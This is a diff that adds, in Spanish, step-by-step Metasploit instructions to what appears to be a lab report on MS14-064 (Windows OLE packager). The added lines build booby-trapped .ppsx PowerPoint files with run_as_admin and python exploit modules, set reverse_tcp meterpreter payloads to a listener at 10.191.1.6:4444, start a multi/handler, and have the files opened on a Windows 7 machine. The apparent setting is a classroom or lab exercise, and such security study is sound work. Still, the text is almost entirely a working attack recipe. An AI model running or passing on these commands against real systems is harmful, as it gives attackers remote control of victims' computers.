@@ -14,5 +14,56 @@ Windows RT 8.1
 Link del video: https://www.dropbox.com/s/is9pdjhpx7rsp54/Video_1552603800.wmv?dl=0
 Captura del trafico por wireshark:
 
+Instructivo para hacer el exploit:
+msfconsole
+use exploit/windows/fileformat/ms14_064_packager_run_as_admin
+
+show options
+
+set FILENAME MS14-064.ppsx
+
+set LHOST 10.191.1.6
+
+set LPORT 4444
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+show options
+
+exploit
+
+use exploit/windows/fileformat/ms14_064_packager_python
+
+show options
+
+set FILENAME MS14-064_py.ppsx
+
+set LHOST 10.191.1.6
+
+set LPORT 4444
+
+show options
+
+exploit 
+use exploit/multi/handler
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+set LHOST 10.191.1.6
+
+set LPORT 4444
+
+show options
+
+exploit -j
+
+ir a window 7 y abrir el archivo MS14-064.ppsx
+
+set PAYLOAD python/meterpreter/reverse_tcp
+r
+exploit -j
+
+ir a window 7 y ejecutar archivo MS14-064_py.ppsx
+
 
 
